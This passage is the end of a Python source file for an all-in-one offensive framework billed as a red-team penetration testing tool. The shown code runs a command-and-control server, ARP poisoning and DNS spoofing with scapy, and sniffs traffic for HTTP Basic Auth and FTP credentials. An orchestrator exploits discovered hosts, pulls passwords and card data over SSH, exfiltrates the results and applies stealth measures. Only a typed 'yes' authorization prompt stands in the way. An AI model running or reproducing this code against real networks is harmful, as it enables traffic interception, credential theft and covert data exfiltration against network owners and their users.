        stats_copy['exfiltrated_devices'] = list(self.stats['exfiltrated_devices'])
        return aiohttp.web.json_response(stats_copy)

    async def start_server(self):
        """Run the C2 server."""
        if not AIOHTTP_AVAILABLE:
            logger.error("aiohttp not available, cannot start C2 server.")
            return
            
        self.app = aiohttp.web.Application()
        self.setup_routes()
        logger.info(f"Starting C2 server on {self.host}:{self.port}")
        runner = aiohttp.web.AppRunner(self.app)
        await runner.setup()
        site = aiohttp.web.TCPSite(runner, self.host, self.port)
        await site.start()
        
        try:
            while True:
                await asyncio.sleep(3600)  # Keep server running
        except KeyboardInterrupt:
            pass
        finally:
            await runner.cleanup()

# ==============================================================================
# BEGIN MODULE: Advanced Network Attacks
# ==============================================================================

class AdvancedNetworkAttacks:
    """
    Handles advanced network attacks like ARP poisoning, DNS spoofing, etc.
    """
    
    def __init__(self, interface: str = 'wlan0'):
        self.interface = interface
        self.poisoning_active = False
        self.sniffing_active = False

    def arp_poisoning(self, target_ip: str, gateway_ip: str) -> bool:
        """Perform ARP poisoning to intercept traffic between target and gateway."""
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available, cannot perform ARP poisoning.")
            return False
            
        try:
            import scapy.all as scapy
            # Get MAC addresses
            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)
            
            if not target_mac or not gateway_mac:
                logger.error(f"Could not get MAC addresses for {target_ip} or {gateway_ip}")
                return False

            # Start poisoning in background thread
            self.poisoning_active = True
            def poison():
                while self.poisoning_active:
                    # Tell target that gateway's MAC is ours
                    scapy.send(scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=False)
                    # Tell gateway that target's MAC is ours
                    scapy.send(scapy.ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=False)
                    time.sleep(2)  # Send every 2 seconds

            thread = threading.Thread(target=poison, daemon=True)
            thread.start()
            logger.info(f"ARP poisoning started between {target_ip} and {gateway_ip}")
            return True
        except Exception as e:
            logger.error(f"ARP poisoning failed: {e}")
            return False

    def _get_mac(self, ip: str) -> Optional[str]:
        """Get MAC address for IP using ARP."""
        if not SCAPY_AVAILABLE:
            return None
            
        try:
            result = subprocess.run(['arping', '-c', '1', '-I', self.interface, ip], 
                                    capture_output=True, text=True, timeout=5)
            # Parse output for MAC address
            for line in result.stderr.splitlines():
                if 'reply from' in line and ip in line:
                    # Example: "Unicast reply from 192.168.1.1 [00:11:22:33:44:55] 1.234ms"
                    import re
                    mac_match = re.search(r'\[([0-9a-fA-F:]{17})\]', line)
                    if mac_match:
                        return mac_match.group(1)
        except Exception as e:
            logger.error(f"Error getting MAC for {ip}: {e}")
        return None

    def dns_spoofing(self, target_ip: str, domain: str, fake_ip: str) -> bool:
        """Perform DNS spoofing to redirect domain requests to fake IP."""
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available, cannot perform DNS spoofing.")
            return False
            
        try:
            import scapy.all as scapy
            
            def dns_spoof(pkt):
                if pkt.haslayer(scapy.DNSQR) and domain in pkt[scapy.DNSQR].qname.decode():
                    # Create DNS response packet
                    dns_response = scapy.IP(dst=pkt[scapy.IP].src, src=pkt[scapy.IP].dst) / \
                                   scapy.UDP(dport=pkt[scapy.UDP].sport, sport=pkt[scapy.UDP].dport) / \
                                   scapy.DNS(id=pkt[scapy.DNS].id, qr=1, aa=1, qd=pkt[scapy.DNS].qd, 
                                           an=scapy.DNSRR(rrname=pkt[scapy.DNSQR].qname, rdata=fake_ip))
                    scapy.send(dns_response, verbose=False)
                    logger.info(f"DNS spoofed: {pkt[scapy.DNSQR].qname.decode()} -> {fake_ip}")

            # Start packet sniffing in background thread
            self.sniffing_active = True
            def sniff():
                scapy.sniff(iface=self.interface, filter="udp port 53", prn=dns_spoof, store=0)

            thread = threading.Thread(target=sniff, daemon=True)
            thread.start()
            logger.info(f"DNS spoofing started for {domain} -> {fake_ip}")
            return True
        except Exception as e:
            logger.error(f"DNS spoofing failed: {e}")
            return False

    def packet_sniffing(self, target_ip: str = None, duration: int = 60) -> List[Dict[str, Any]]:
        """Sniff network packets for credential harvesting."""
        if not SCAPY_AVAILABLE:
            logger.error("Scapy not available, cannot perform packet sniffing.")
            return []
            
        try:
            import scapy.all as scapy
            captured_packets = []
            
            def packet_handler(pkt):
                if pkt.haslayer(scapy.Raw):
                    payload = pkt[scapy.Raw].load
                    # Check for HTTP Basic Auth
                    if b'Authorization: Basic' in payload:
                        captured_packets.append({
                            'type': 'http_auth',
                            'payload': payload.decode('utf-8', errors='ignore'),
                            'source': pkt[scapy.IP].src if pkt.haslayer(scapy.IP) else 'unknown',
                            'timestamp': time.time()
                        })
                    # Check for FTP login
                    payload_str = payload.decode('utf-8', errors='ignore')
                    if 'USER ' in payload_str or 'PASS ' in payload_str:
                        captured_packets.append({
                            'type': 'ftp_login',
                            'payload': payload_str,
                            'source': pkt[scapy.IP].src if pkt.haslayer(scapy.IP) else 'unknown',
                            'timestamp': time.time()
                        })

            # Sniff for specified duration
            scapy.sniff(iface=self.interface, prn=packet_handler, timeout=duration, store=0)
            logger.info(f"Captured {len(captured_packets)} credential packets")
            return captured_packets
        except Exception as e:
            logger.error(f"Packet sniffing failed: {e}")
            return []

    def stop_all_attacks(self):
        """Stop all active network attacks."""
        self.poisoning_active = False
        self.sniffing_active = False
        logger.info("All network attacks stopped.")

# ==============================================================================
# BEGIN MODULE: Reporting
# ==============================================================================

class ReportGenerator:
    """
    Generates comprehensive reports from penetration test results.
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.output_dir = Path(config.get('output_dir', './reports'))
        self.output_dir.mkdir(exist_ok=True)

    def generate_report(self, results: Dict[str, Any]) -> str:
        """Generate a comprehensive penetration test report."""
        report_data = {
            'scan_time': results.get('scan_time'),
            'target_network': results.get('target_network'),
            'executive_summary': self._generate_executive_summary(results),
            'data_summary': self._generate_data_summary(results),
            'critical_findings': self._count_critical_findings(results),
            'security_posture': self._assess_security_posture(results),
            'recommendations': self._generate_recommendations(results),
            'raw_data': results if self.config.get('include_sensitive_data', False) else self._sanitize_report(results)
        }

        # Save report to JSON
        report_filename = self.output_dir / f"{self.config.get('report_filename_prefix', 'pentest_report')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w') as f:
            json.dump(report_data, f, indent=2, ensure_ascii=False)
        
        logger.info(f"Report generated: {report_filename}")
        return str(report_filename)

    def _generate_executive_summary(self, results: Dict[str, Any]) -> str:
        """Generate high-level executive summary."""
        summary = f"""
        Executive Summary:
        - Network scanned: {results.get('target_network', 'Unknown')}
        - Total devices discovered: {len(results.get('devices', []))}
        - Successfully exploited: {results.get('summary', {}).get('successfully_exploited', 0)}
        - Privilege escalation achieved: {results.get('summary', {}).get('privilege_escalation_success', 0)}
        - Persistence established: {results.get('summary', {}).get('persistence_established', 0)}
        - Critical findings: {len(results.get('summary', {}).get('critical_findings', []))}
        """
        return summary.strip()

    def _generate_data_summary(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Generate detailed data summary."""
        summary = {
            'total_devices': len(results.get('devices', [])),
            'exploited_devices': results.get('summary', {}).get('successfully_exploited', 0),
            'vulnerable_ports': 0,
            'credentials_found': 0,
            'sensitive_files': 0,
            'network_configurations': 0
        }

        for device in results.get('devices', []):
            if device.get('port_scan'):
                summary['vulnerable_ports'] += len(device['port_scan'].get('vulnerable_ports', []))
            if device.get('extracted_data'):
                extracted = device['extracted_data']
                summary['credentials_found'] += len(extracted.get('credentials', []))
                summary['sensitive_files'] += len(extracted.get('files', []))
                summary['network_configurations'] += 1 if extracted.get('network_info') else 0

        return summary

    def _count_critical_findings(self, results: Dict[str, Any]) -> List[str]:
        """Count and list critical findings."""
        findings = []
        for device in results.get('devices', []):
            ip = device.get('ip', 'unknown')
            if device.get('vulnerabilities', {}).get('sql_injection'):
                findings.append(f"SQL Injection vulnerability found on {ip}")
            if device.get('vulnerabilities', {}).get('ftp_anonymous_access'):
                findings.append(f"Anonymous FTP access enabled on {ip}")
            if device.get('privilege_escalated'):
                findings.append(f"Root access obtained on {ip}")
            if device.get('extracted_data'):
                sensitive = device['extracted_data'].get('sensitive_data', {})
                if sensitive.get('credit_cards'):
                    findings.append(f"Credit card data found on {ip}")
                if sensitive.get('passwords'):
                    findings.append(f"Plaintext passwords found on {ip}")
        return findings

    def _assess_security_posture(self, results: Dict[str, Any]) -> Dict[str, str]:
        """Assess overall security posture."""
        summary = results.get('summary', {})
        exploited = summary.get('successfully_exploited', 0)
        total = len(results.get('devices', []))
        
        if total == 0:
            return {'risk_level': 'unknown', 'description': 'No devices scanned'}
        
        exploitation_rate = exploited / total
        
        if exploitation_rate >= 0.5:
            risk_level = 'critical'
            description = 'High percentage of devices successfully exploited. Immediate security measures required.'
        elif exploitation_rate >= 0.25:
            risk_level = 'high'
            description = 'Significant number of devices exploited. Comprehensive security review needed.'
        elif exploitation_rate > 0:
            risk_level = 'medium'
            description = 'Some devices were exploited. Security improvements recommended.'
        else:
            risk_level = 'low'
            description = 'No devices successfully exploited. Security posture appears strong.'
        
        return {'risk_level': risk_level, 'description': description}

    def _generate_recommendations(self, results: Dict[str, Any]) -> List[str]:
        """Generate security recommendations based on findings."""
        recommendations = []
        
        # Add recommendations based on findings
        for device in results.get('devices', []):
            if device.get('vulnerabilities', {}).get('ssh_weak_auth'):
                recommendations.append("Implement strong SSH authentication and disable password-based login.")
            if device.get('vulnerabilities', {}).get('ftp_anonymous_access'):
                recommendations.append("Disable anonymous FTP access or implement proper authentication.")
            if device.get('vulnerabilities', {}).get('web_vulns'):
                recommendations.append("Update web applications and implement input validation.")
            if device.get('extracted_data', {}).get('credentials'):
                recommendations.append("Implement credential rotation and use of password managers.")
        
        # Add general recommendations
        if not recommendations:
            recommendations.append("No specific vulnerabilities found. Maintain current security practices.")
        
        # Remove duplicates
        return list(set(recommendations))

    def _sanitize_report(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Sanitize report to remove sensitive data."""
        sanitized = results.copy()
        
        # Remove sensitive content from extracted data
        for device in sanitized.get('devices', []):
            if 'extracted_data' in device:
                extracted = device['extracted_data']
                if 'credentials' in extracted:
                    # Keep only metadata, remove actual content
                    for cred in extracted['credentials']:
                        if 'content' in cred:
                            cred['content'] = '[REDACTED]'
                if 'files' in extracted:
                    for file_entry in extracted['files']:
                        if 'content' in file_entry:
                            file_entry['content'] = '[REDACTED]'
                if 'sensitive_data' in extracted:
                    extracted['sensitive_data'] = {
                        k: f'[REDACTED - {len(v)} items]' if isinstance(v, list) else '[REDACTED]'
                        for k, v in extracted['sensitive_data'].items()
                    }
        
        return sanitized

# ==============================================================================
# BEGIN MODULE: Main Orchestrator
# ==============================================================================

class RedTeamFramework:
    """
    Main orchestrator for the Red Team framework.
    """
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or DEFAULT_CONFIG
        self.results = {
            "scan_time": datetime.now().isoformat(),
            "target_network": None,
            "devices": [],
            "summary": {}
        }
        
        # Initialize core modules
        self.stealth_techniques = StealthTechniques(self.config.get('stealth', {}))
        self.exploitation_engine = ExploitationEngine(
            wordlist_path=self.config.get('brute_force', {}).get('wordlist', None)
        )
        self.data_categorizer = DataCategorizer()
        self.data_exfiltrator = DataExfiltrator(self.config.get('exfiltration', {}))
        self.adaptive_stealth = AdaptiveStealth(self.config.get('ml', {}))
        self.advanced_network_attacks = AdvancedNetworkAttacks(
            interface=self.config.get('stealth', {}).get('interface', 'wlan0')
        )
        self.report_generator = ReportGenerator(self.config.get('reporting', {}))

    def _load_config(self, config_path: Optional[str] = None) -> Dict[str, Any]:
        """Load configuration from file or use default."""
        if config_path and os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    return yaml.safe_load(f) or DEFAULT_CONFIG
            except Exception as e:
                logger.error(f"Error loading config from {config_path}: {e}")
                return DEFAULT_CONFIG
        return DEFAULT_CONFIG

    async def run_comprehensive_scan(self, network_range: str) -> Dict:
        """Main scanning and exploitation workflow."""
        self.results["target_network"] = network_range
        logger.info(f"Starting comprehensive scan on {network_range}")

        # Apply stealth techniques
        self.stealth_techniques.setup_proxy_session()

        # Discover devices
        devices = await self.exploitation_engine.discover_devices(network_range)
        self.results["devices"] = devices

        for device in devices:
            logger.info(f"Processing device: {device['ip']}")

            # Apply request delay for stealth
            await self.stealth_techniques.apply_request_delay()

            # Scan ports
            port_results = await self.exploitation_engine.scan_ports(device['ip'])
            device['port_scan'] = port_results

            # Assess vulnerabilities
            vuln_results = await self.exploitation_engine.assess_vulnerabilities(device)
            device['vulnerabilities'] = vuln_results

            # Attempt exploitation
            access_results = await self.exploitation_engine.gain_initial_access(device)
            device['access_results'] = access_results

            if not access_results.get('success'):
                logger.warning(f"Failed to gain access to {device['ip']}")
                continue

            # Extract data
            for access_method in access_results['access_methods']:
                if access_method['service'] == 'ssh':
                    try:
                        extractor = DataExtractor(access_method)
                        extracted_data = extractor.extract_sensitive_data()
                        device.setdefault('extracted_data', []).append(extracted_data)
                        extractor.close()
                    except Exception as e:
                        logger.error(f"Data extraction failed: {e}")

            # Categorize data
            if device.get('extracted_data'):
                categorized = self.data_categorizer.categorize_data(device['extracted_data'][0])
                device['categorized_data'] = categorized

            # Exfiltrate data
            try:
                await self.data_exfiltrator.exfiltrate(device, device.get('categorized_data', {}))
            except Exception as e:
                logger.error(f"Exfiltration failed: {e}")

            # Adaptive stealth
            self.adaptive_stealth.record_behavior(
                {'technique': 'initial_access', 'target_ip': device['ip']},
                {'success': True, 'stealth_detected': False}
            )

        # Generate summary
        self._generate_summary()
        return self.results

    async def run_targeted_attack(self, target_ip: str, attack_type: str) -> Dict:
        """Run a targeted attack against a specific IP."""
        logger.info(f"Running targeted {attack_type} attack on {target_ip}")
        
        if attack_type == 'arp_poisoning':
            success = self.advanced_network_attacks.arp_poisoning(target_ip, self.exploitation_engine.detect_gateway())
            return {'success': success, 'target': target_ip, 'attack': attack_type}
        elif attack_type == 'credential_harvest':
            credentials = self.advanced_network_attacks.packet_sniffing(target_ip, duration=30)
            return {'success': len(credentials) > 0, 'target': target_ip, 'attack': attack_type, 'credentials_found': len(credentials)}
        else:
            logger.error(f"Unknown attack type: {attack_type}")
            return {'success': False, 'target': target_ip, 'attack': attack_type, 'error': 'Unknown attack type'}

    def _generate_summary(self):
        """Generate executive summary of findings."""
        total_devices = len(self.results["devices"])
        exploited = sum(1 for d in self.results["devices"] if d.get('access_results', {}).get('success'))
        escalated = sum(1 for d in self.results["devices"] if d.get('privilege_escalated'))
        persisted = sum(1 for d in self.results["devices"] if d.get('persistence_established'))

        self.results["summary"] = {
            "total_devices_scanned": total_devices,
            "successfully_exploited": exploited,
            "privilege_escalation_success": escalated,
            "persistence_established": persisted,
            "critical_findings": self._extract_critical_findings()
        }

    def _extract_critical_findings(self) -> List[str]:
        findings = []
        for device in self.results["devices"]:
            ip = device['ip']
            if device.get('vulnerabilities', {}).get('sql_injection'):
                findings.append(f"SQLi vulnerable endpoint on {ip}")
            if device.get('privilege_escalated'):
                findings.append(f"Root access obtained on {ip}")
            if device.get('extracted_data'):
                for data in device['extracted_data']:
                    if data.get('credit_cards') or data.get('passwords'):
                        findings.append(f"PII/credentials exfiltrated from {ip}")
        return findings

    def cleanup(self):
        """Clean up resources and artifacts."""
        logger.info("Cleaning up framework resources...")
        self.advanced_network_attacks.stop_all_attacks()
        self.data_exfiltrator.close()
        self.stealth_techniques.cleanup_temp_files()

# ==============================================================================
# MAIN ENTRY POINT
# ==============================================================================

async def main():
    parser = argparse.ArgumentParser(description="Comprehensive Red Team Penetration Testing Framework")
    parser.add_argument("--scan", "-s", help="Target network range (e.g., 192.168.1.0/24)")
    parser.add_argument("--target", "-t", help="Target IP for targeted attack")
    parser.add_argument("--attack-type", "-a", help="Type of targeted attack (arp_poisoning, credential_harvest)")
    parser.add_argument("--config", "-c", help="Path to config file (not used in all-in-one version)")
    parser.add_argument("--c2-server", action="store_true", help="Start C2 server instead of scan")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose logging")
    parser.add_argument("--stealth-level", choices=['low', 'medium', 'high'], default='medium', help="Stealth level")
    parser.add_argument("--port", type=int, default=8080, help="Port for C2 server")
    
    args = parser.parse_args()

    # Update config based on arguments
    if args.stealth_level:
        DEFAULT_CONFIG['stealth']['level'] = args.stealth_level
    if args.verbose:
        DEFAULT_CONFIG['general']['verbose'] = True
        DEFAULT_CONFIG['general']['log_level'] = "DEBUG"

    print("=" * 80)
    print("⚠️  WARNING: This is a powerful penetration testing tool.")
    print("    Use ONLY on networks you own or have explicit written permission to test.")
    print("    Unauthorized use is illegal and unethical.")
    print("=" * 80)
    response = input("Do you confirm you have authorization? (yes/no): ")
    if response.lower() != 'yes':
        print("Aborted.")
        sys.exit(1)

    framework = RedTeamFramework()
    
    try:
        if args.c2_server:
            print(f"🚀 Starting C2 server on port {args.port}...")
            c2_server = C2Server(port=args.port, encryption_key=DEFAULT_CONFIG.get('c2_server', {}).get('encryption_key', 'default-key-32-bytes-32bytes!!'))
            await c2_server.start_server()
        elif args.scan:
            print(f"🚀 Starting comprehensive scan on network: {args.scan}")
            results = await framework.run_comprehensive_scan(args.scan)
            print(f"\n✅ Scan completed successfully!")
            print(f"   Devices scanned: {results['summary']['total_devices_scanned']}")
            print(f"   Successfully exploited: {results['summary']['successfully_exploited']}")
            print(f"   Privilege escalation: {results['summary']['privilege_escalation_success']}")
            print(f"   Persistence established: {results['summary']['persistence_established']}")
            
            # Generate report
            report_path = framework.report_generator.generate_report(results)
            print(f"   Report saved to: {report_path}")
        elif args.target and args.attack_type:
            print(f"🎯 Running targeted {args.attack_type} attack on {args.target}")
            result = await framework.run_targeted_attack(args.target, args.attack_type)
            print(f"   Attack result: {'Success' if result['success'] else 'Failed'}")
        else:
            print("❌ Error: You must specify either --scan for scanning, --target with --attack-type for targeted attack, or --c2-server to start the C2 server")
            parser.print_help()
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n⚠️  Operation interrupted by user.")
    except Exception as e:
        logger.error(f"Critical error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    finally:
        framework.cleanup()

if __name__ == "__main__":
    asyncio.run(main())